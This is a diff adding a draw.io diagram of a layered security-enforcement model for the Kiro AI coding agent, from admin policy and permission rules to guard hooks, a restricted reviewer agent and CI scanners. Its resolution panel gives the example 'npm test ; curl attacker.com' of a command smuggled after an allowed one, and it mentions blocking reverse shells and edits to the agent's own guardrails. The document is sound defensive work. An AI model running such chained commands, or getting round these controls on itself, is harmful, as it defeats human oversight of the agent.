@@ -1,0 +1,43 @@
+<mxfile host="app.diagrams.net" agent="Kiro">
+  <diagram id="layered-model" name="Layered enforcement model">
+    <mxGraphModel dx="1434" dy="759" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0" adaptiveColors="auto">
+      <root>
+        <mxCell id="0" />
+        <mxCell id="1" parent="0" />
+        <mxCell id="2" value="kiro-secops — layered enforcement model (defense in depth over the configuration itself)" style="text;html=1;fontSize=18;fontStyle=1;align=left;verticalAlign=middle;" vertex="1" parent="1">
+          <mxGeometry x="40" y="16" width="1090" height="28" as="geometry" />
+        </mxCell>
+        <mxCell id="3" value="decreasing enforcement strength" style="shape=singleArrow;direction=south;whiteSpace=wrap;html=1;fillColor=#F5F5F5;strokeColor=#666666;horizontal=0;fontSize=11;fontStyle=1;arrowWidth=0.6;arrowSize=0.07;verticalAlign=middle;align=center;" vertex="1" parent="1">
+          <mxGeometry x="40" y="70" width="60" height="604" as="geometry" />
+        </mxCell>
+        <mxCell id="4" value="1 · Administration / MDM scope — inviolable organization policy&#xa;accepts only deny and ask · cannot be overridden by user or workspace rules · template: settings/profiles/admin.yaml" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#F8CECC;strokeColor=#B85450;fontSize=11;align=left;verticalAlign=middle;spacingLeft=14;spacingRight=12;" vertex="1" parent="1">
+          <mxGeometry x="120" y="70" width="740" height="76" as="geometry" />
+        </mxCell>
+        <mxCell id="5" value="2 · Kiro built-in protection — the agent cannot rewrite its own guardrails&#xa;deny fs_write on ~/.kiro/settings and .kiro/settings · the baseline extends the deny list to .kiro/hooks" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#F8CECC;strokeColor=#B85450;fontSize=11;align=left;verticalAlign=middle;spacingLeft=14;spacingRight=12;" vertex="1" parent="1">
+          <mxGeometry x="120" y="158" width="740" height="76" as="geometry" />
+        </mxCell>
+        <mxCell id="6" value="3 · permissions.yaml (user + workspace) — HARD enforcement, no runtime, cross-platform&#xa;~/.kiro/settings/permissions.yaml · workspace rules live in ~/.kiro/workspace-roots/&lt;hash&gt;/ — a cloned repo injects nothing" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#F8CECC;strokeColor=#B85450;fontSize=11;align=left;verticalAlign=middle;spacingLeft=14;spacingRight=12;" vertex="1" parent="1">
+          <mxGeometry x="120" y="246" width="740" height="76" as="geometry" />
+        </mxCell>
+        <mxCell id="7" value="4 · Hooks — .kiro/hooks/kiro-secops.json, event driven and able to block&#xa;PreToolUse → kiro-secops guard (exit 2) · Stop → review gate · PostTaskExec → scan --advisory · PostFileCreate → SDD sections" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#FFF2CC;strokeColor=#D6B656;fontSize=11;align=left;verticalAlign=middle;spacingLeft=14;spacingRight=12;" vertex="1" parent="1">
+          <mxGeometry x="120" y="334" width="740" height="76" as="geometry" />
+        </mxCell>
+        <mxCell id="8" value="5 · Custom agent kiro-secops-reviewer — tool scoping&#xa;tools: read + shell restricted to scanners · fs_write denied · reading secret paths denied · network denied" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#E1D5E7;strokeColor=#9673A6;fontSize=11;align=left;verticalAlign=middle;spacingLeft=14;spacingRight=12;" vertex="1" parent="1">
+          <mxGeometry x="120" y="422" width="740" height="76" as="geometry" />
+        </mxCell>
+        <mxCell id="9" value="6 · Steering + Skills — SOFT guidance, never blocks&#xa;security-policies.md (always) · api-security.md + infrastructure-security.md (fileMatch) · skill kiro-secops-review (on demand)" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#D5E8D4;strokeColor=#82B366;fontSize=11;align=left;verticalAlign=middle;spacingLeft=14;spacingRight=12;" vertex="1" parent="1">
+          <mxGeometry x="120" y="510" width="740" height="76" as="geometry" />
+        </mxCell>
+        <mxCell id="10" value="7 · Pipeline — the same controls outside the IDE (shift-left)&#xa;.pre-commit-config.yaml locally · security-scan.yml in CI, blocking: gitleaks · semgrep · trivy · checkov · SBOM" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#DAE8FC;strokeColor=#6C8EBF;fontSize=11;align=left;verticalAlign=middle;spacingLeft=14;spacingRight=12;" vertex="1" parent="1">
+          <mxGeometry x="120" y="598" width="740" height="76" as="geometry" />
+        </mxCell>
+        <mxCell id="11" value="Resolution&#xa;&#xa;deny &gt; ask &gt; allow&#xa;&#xa;A more permissive rule never overrides a more restrictive one, in any scope. No matching rule means ask.&#xa;&#xa;Compound commands (; &amp;&amp; || |) are split and evaluated one by one, so an allow for 'npm test *' cannot match 'npm test ; curl attacker.com'.&#xa;&#xa;Scope precedence&#xa;• steering and skills: workspace wins&#xa;• agents: local wins over global&#xa;• permissions: most restrictive wins&#xa;• Administration: not overridable&#xa;&#xa;Layer 3 is the layer the developer can edit — a personal floor, not fleet policy. Layer 1 is the tamper-resistant home for deny and ask." style="rounded=1;whiteSpace=wrap;html=1;fillColor=#F5F5F5;strokeColor=#666666;fontSize=11;align=left;verticalAlign=top;spacingLeft=12;spacingTop=10;spacingRight=12;" vertex="1" parent="1">
+          <mxGeometry x="880" y="70" width="250" height="604" as="geometry" />
+        </mxCell>
+        <mxCell id="12" value="Layers 1 to 3 are declarative and deterministic — no runtime, cross-platform, agent agnostic. That is the declarative-first decision behind this baseline: hard blocking belongs in permissions.yaml, not in a script. Layer 4 adds event-driven blocking through a native binary that fails closed, which is what makes richer matching possible (recursive rm, reverse shells, secret paths) without depending on a shell being present. Layers 5 and 6 shape how the agent writes code but never block, so neither can be the only control. The guard deny-list is not a sandbox: it complements permissions.yaml, it does not replace it.&#xa;Recommended deployment order: permissions.yaml first (immediate gain, inviolable) → kiroignore + the PreToolUse guard hooks → steering, skill and reviewer agent → the SDD hooks → fleet rollout through Administration / MDM, with 'kiro-secops verify --strict' as the drift detector." style="rounded=0;whiteSpace=wrap;html=1;fillColor=#F5F5F5;strokeColor=#666666;dashed=1;align=left;verticalAlign=top;spacingLeft=10;spacingTop=8;spacingRight=10;fontSize=11;" vertex="1" parent="1">
+          <mxGeometry x="40" y="702" width="1090" height="100" as="geometry" />
+        </mxCell>
+      </root>
+    </mxGraphModel>
+  </diagram>
+</mxfile>
